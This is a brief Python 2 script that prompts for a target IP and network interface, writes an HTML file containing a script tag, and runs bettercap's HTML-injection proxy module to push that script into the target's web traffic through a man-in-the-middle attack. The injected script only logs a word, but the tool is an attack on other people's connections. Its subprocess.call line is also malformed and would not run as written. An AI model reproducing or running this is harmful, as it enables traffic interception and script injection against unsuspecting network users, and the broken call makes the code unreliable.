import subprocess

target = raw_input("[IP]")
interface = raw_input("[dev]")
html = '''<script>console.log('boya')</script>'''

html_file = open("min.html", "w")
html_file.write(html)
html_file.close()

subprocess.call('bettercap', '-I', interface, '-T', target, '--proxy-module', 'injecthtml', '--html-file', 'min.html')
